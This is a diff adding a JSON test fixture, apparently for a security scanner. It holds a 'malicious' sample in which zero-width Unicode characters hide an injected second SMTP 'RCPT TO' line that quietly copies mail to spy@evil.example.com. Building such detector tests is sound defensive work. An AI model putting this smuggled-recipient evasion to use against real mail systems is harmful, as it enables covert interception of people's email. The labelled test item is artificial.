@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::95::unicode-variations::3",
+  "base_sample_id": "exp::email-webfetch::95",
+  "generator_id": "unicode-variations",
+  "generator_version": "1.0.0",
+  "seed": -1440204459,
+  "content": "RCPT﻿ TO: <victim@⁠t‌arget.e‍xampl⁠e.com>\r\nRC﻿PT‌ ‍TO: <s​py@evil.​exa⁠mple​.‍com>\n",
+  "content_hash": "7a090a59cfaeb391f9a7ce2e8fe7f5732ae0be0f9668a1758058ffc0a629edfa",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "unicode:zero-width",
+  "difficulty": "advanced"
+}
